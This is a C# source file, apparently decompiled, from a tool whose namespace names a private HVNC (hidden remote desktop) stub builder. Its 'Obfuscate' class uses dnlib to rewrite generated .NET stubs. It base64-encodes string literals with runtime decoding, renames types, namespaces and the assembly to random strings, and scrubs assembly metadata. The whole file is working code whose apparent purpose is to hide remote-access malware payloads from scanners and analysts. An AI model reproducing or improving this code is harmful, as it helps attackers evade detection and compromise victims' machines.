using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace ShitarusPrivate.HVNC.StubUtils
{
    internal class Obfuscate
    {
        [Serializable]
        [CompilerGenerated]
        private sealed class __c
        {
            public static readonly __c __9 = new __c();

            public static Func<string, char> __9__2_0;

            internal char _random_string_b__2_0(string s)
            {
                return s[random.Next(s.Length)];
            }
        }

        private static Random random = new Random();

        private static List<string> names = new List<string>();

        public static string random_string(int length)
        {
            string text = "";
            do
            {
                text = new string(Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length).Select(__c.__9__2_0 ?? (__c.__9__2_0 = __c.__9._random_string_b__2_0)).ToArray());
            }
            while (names.Contains(text));
            return text;
        }

        public static void clean_asm(ModuleDef md)
        {
            foreach (TypeDef type in md.GetTypes())
            {
                foreach (MethodDef method in type.Methods)
                {
                    if (method.HasBody)
                    {
                        method.Body.SimplifyBranches();
                        method.Body.OptimizeBranches();
                    }
                }
            }
        }

        public static void obfuscate_strings(ModuleDef md)
        {
            foreach (TypeDef type in md.GetTypes())
            {
                foreach (MethodDef method in type.Methods)
                {
                    if (!method.HasBody)
                    {
                        continue;
                    }
                    for (int i = 0; i < method.Body.Instructions.Count(); i++)
                    {
                        if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                        {
                            string text = method.Body.Instructions[i].Operand.ToString();
                            string text2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
                            Console.WriteLine(text + " -> " + text2);
                            method.Body.Instructions[i].OpCode = OpCodes.Nop;
                            method.Body.Instructions.Insert(i + 1, new Instruction(OpCodes.Call, md.Import(typeof(Encoding).GetMethod("get_UTF8", new Type[0]))));
                            method.Body.Instructions.Insert(i + 2, new Instruction(OpCodes.Ldstr, text2));
                            method.Body.Instructions.Insert(i + 3, new Instruction(OpCodes.Call, md.Import(typeof(Convert).GetMethod("FromBase64String", new Type[1] { typeof(string) }))));
                            method.Body.Instructions.Insert(i + 4, new Instruction(OpCodes.Callvirt, md.Import(typeof(Encoding).GetMethod("GetString", new Type[1] { typeof(byte[]) }))));
                            i += 4;
                        }
                    }
                }
            }
        }

        public static void obfuscate_classes(ModuleDef md)
        {
            foreach (TypeDef type in md.GetTypes())
            {
                string text = random_string(10);
                Console.WriteLine($"{type.Name} -> {text}");
                type.Name = text;
            }
        }

        public static void obfuscate_namespace(ModuleDef md)
        {
            foreach (TypeDef type in md.GetTypes())
            {
                string text = random_string(10);
                Console.WriteLine($"{type.Namespace} -> {text}");
                type.Namespace = text;
            }
        }

        public static void obfuscate_assembly_info(ModuleDef md)
        {
            string text = random_string(10);
            Console.WriteLine($"{md.Assembly.Name} -> {text}");
            md.Assembly.Name = text;
            string[] source = new string[6] { "AssemblyDescriptionAttribute", "AssemblyTitleAttribute", "AssemblyProductAttribute", "AssemblyCopyrightAttribute", "AssemblyCompanyAttribute", "AssemblyFileVersionAttribute" };
            foreach (CustomAttribute customAttribute in md.Assembly.CustomAttributes)
            {
                if (source.Any(customAttribute.AttributeType.Name.Contains))
                {
                    string text2 = random_string(10);
                    Console.WriteLine($"{customAttribute.AttributeType.Name} = {text2}");
                    customAttribute.ConstructorArguments[0] = new CAArgument(md.CorLibTypes.String, new UTF8String(text2));
                }
            }
        }

        public static ModuleDefMD obfuscate(ModuleDefMD md)
        {
            md.Name = random_string(10);
            obfuscate_strings(md);
            obfuscate_classes(md);
            obfuscate_namespace(md);
            obfuscate_assembly_info(md);
            clean_asm(md);
            return md;
        }
    }
}
